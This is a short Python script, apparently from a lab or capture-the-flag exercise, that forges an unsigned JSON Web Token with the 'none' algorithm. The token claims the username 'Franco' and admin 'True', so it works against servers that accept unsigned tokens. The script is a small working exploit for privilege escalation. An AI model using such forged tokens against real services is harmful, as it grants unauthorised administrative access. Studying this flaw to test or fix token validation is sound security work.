import jwt
import json 

## cualquier cosa yo realice cambios aca /usr/lib/python3.10/collections/__init__.py
string = '{ "username":"Franco", "admin":"True"}'


json = json.loads(string)


encoded = jwt.encode({ "username":"Franco", "admin":"True"},None,algorithm="none")

print(f"{str(encoded)}")